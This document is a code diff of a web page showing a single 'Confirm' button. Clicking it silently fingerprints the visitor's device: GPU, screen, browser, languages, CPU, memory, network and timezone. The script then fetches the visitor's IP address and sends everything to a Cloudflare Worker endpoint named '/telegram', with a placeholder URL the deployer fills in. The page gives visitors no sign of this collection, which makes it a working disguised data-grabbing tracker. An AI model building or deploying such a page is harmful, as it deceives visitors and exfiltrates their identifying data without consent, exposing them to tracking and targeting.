@@ -3,166 +3,329 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
   <title>Confirm</title>
+
   <style>
     * {
       box-sizing: border-box;
     }
+
     body {
       margin: 0;
       min-height: 100vh;
+
       display: flex;
       justify-content: center;
       align-items: center;
+
       background: #050505;
       font-family: Arial, sans-serif;
     }
+
     button {
       padding: 14px 32px;
+
       border: none;
       border-radius: 8px;
+
       background: white;
       color: black;
+
       font-size: 17px;
       font-weight: bold;
+
       cursor: pointer;
     }
+
     button:disabled {
       opacity: 0.5;
       cursor: not-allowed;
     }
+
     #result {
       position: absolute;
       margin-top: 110px;
+
       color: white;
       font-size: 16px;
     }
   </style>
 </head>
+
 <body>
+
   <button id="confirmBtn" onclick="confirmShare()">
     Confirm
   </button>
+
   <div id="result"></div>
+
   <script>
+
+    // ضع هنا رابط الـWorker الخاص بك
+    const WORKER_URL =
+      "https://YOUR-WORKER.YOUR-SUBDOMAIN.workers.dev";
+
+
     async function confirmShare() {
+
       const button =
         document.getElementById("confirmBtn");
+
       const result =
         document.getElementById("result");
+
       button.disabled = true;
+
       result.textContent =
         "Processing...";
+
+
       try {
+
+        // =========================
         // GPU
+        // =========================
+
         let gpu = "Unavailable";
+
         try {
+
           const canvas =
             document.createElement("canvas");
+
           const gl =
             canvas.getContext("webgl") ||
             canvas.getContext("experimental-webgl");
+
           if (gl) {
+
             const debugInfo =
               gl.getExtension(
                 "WEBGL_debug_renderer_info"
               );
-            gpu = debugInfo
-              ? gl.getParameter(
-                  debugInfo.UNMASKED_RENDERER_WEBGL
-                )
-              : gl.getParameter(gl.RENDERER);
+
+            if (debugInfo) {
+
+              gpu = gl.getParameter(
+                debugInfo.UNMASKED_RENDERER_WEBGL
+              );
+
+            } else {
+
+              gpu = gl.getParameter(
+                gl.RENDERER
+              );
+
+            }
           }
-        } catch (e) {}
-        // Network
+
+        } catch (e) {
+
+          gpu = "Unavailable";
+
+        }
+
+
+        // =========================
+        // NETWORK
+        // =========================
+
         const connection =
           navigator.connection ||
           navigator.mozConnection ||
           navigator.webkitConnection;
+
+
+        // =========================
+        // DEVICE INFORMATION
+        // =========================
+
         const info = {
+
           screen: {
-            width: screen.width,
-            height: screen.height,
-            colorDepth: screen.colorDepth,
-            pixelRatio: window.devicePixelRatio
+
+            width:
+              screen.width,
+
+            height:
+              screen.height,
+
+            colorDepth:
+              screen.colorDepth,
+
+            pixelRatio:
+              window.devicePixelRatio
+
           },
+
+
           viewport: {
-            width: window.innerWidth,
-            height: window.innerHeight
+
+            width:
+              window.innerWidth,
+
+            height:
+              window.innerHeight
+
           },
+
+
           browser: {
-            userAgent: navigator.userAgent,
-            language: navigator.language
+
+            userAgent:
+              navigator.userAgent,
+
+            language:
+              navigator.language,
+
+            languages:
+              navigator.languages
+
           },
+
+
           system: {
-            platform: navigator.platform,
+
+            platform:
+              navigator.platform,
+
             cpuCores:
               navigator.hardwareConcurrency ||
               "Unavailable",
+
             deviceMemoryGB:
               navigator.deviceMemory ||
               "Unavailable"
+
           },
-          gpu: gpu,
+
+
+          gpu:
+            gpu,
+
+
           device: {
+
             touchPoints:
               navigator.maxTouchPoints,
+
             cookiesEnabled:
               navigator.cookieEnabled,
+
             online:
               navigator.onLine
+
           },
+
+
           network: connection ? {
+
             type:
               connection.effectiveType ||
               "Unavailable",
+
             downlink:
               connection.downlink ||
               "Unavailable",
+
             rtt:
               connection.rtt ||
               "Unavailable"
+
           } : "Unavailable",
+
+
           timezone:
             Intl.DateTimeFormat()
               .resolvedOptions()
               .timeZone,
+
+
           timestamp:
             new Date().toISOString()
+
         };
-        // Get IP
+
+
+        // =========================
+        // GET IP FROM WORKER
+        // =========================
+
         const ipResponse =
-          await fetch("/ip");
+          await fetch(
+            WORKER_URL + "/ip"
+          );
+
+
         if (!ipResponse.ok) {
-          throw new Error("IP request failed");
+
+          throw new Error(
+            "IP request failed"
+          );
+
         }
+
+
         const ipData =
           await ipResponse.json();
+
+
         info.ip =
           ipData.ip;
-        // Send information to Worker
-        const response =
-          await fetch("/telegram", {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json"
-            },
-            body: JSON.stringify(info)
-          });
-        if (!response.ok) {
+
+
+        // =========================
+        // SEND DATA TO WORKER
+        // =========================
+
+        const telegramResponse =
+          await fetch(
+            WORKER_URL + "/telegram",
+            {
+
+              method: "POST",
+
+              headers: {
+                "Content-Type":
+                  "application/json"
+              },
+
+              body:
+                JSON.stringify(info)
+
+            }
+          );
+
+
+        if (!telegramResponse.ok) {
+
           throw new Error(
             "Telegram request failed"
           );
+
         }
+
+
         result.textContent =
-          "Confirmed";
+          "Confirmed ✓";
+
+
       } catch (error) {
+
         console.error(error);
+
         result.textContent =
           "Something went wrong.";
+
         button.disabled = false;
+
       }
+
     }
+
   </script>
+
 </body>
 </html>
